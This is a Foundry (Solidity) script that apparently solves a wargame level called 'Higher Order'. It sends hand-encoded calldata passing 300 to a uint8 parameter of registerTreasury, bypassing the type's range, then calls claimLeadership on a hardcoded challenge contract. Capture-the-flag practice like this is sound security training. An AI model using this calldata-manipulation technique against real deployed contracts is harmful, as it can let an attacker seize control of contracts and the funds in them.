// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IChallagne{
    function claimLeadership() external;
}

contract HigherOrderScript is Script{
    function run() public{
        address challagneAddrr = 0x4e366d9E736f2887bd0F8E46312A5b6F5E394C84;
        IChallagne Challagne = IChallagne(challagneAddrr);
        bytes memory data = abi.encodeWithSignature("registerTreasury(uint8)", 300);

        vm.startBroadcast();

        challagneAddrr.call(data);
        Challagne.claimLeadership();

        vm.stopBroadcast();
    }
}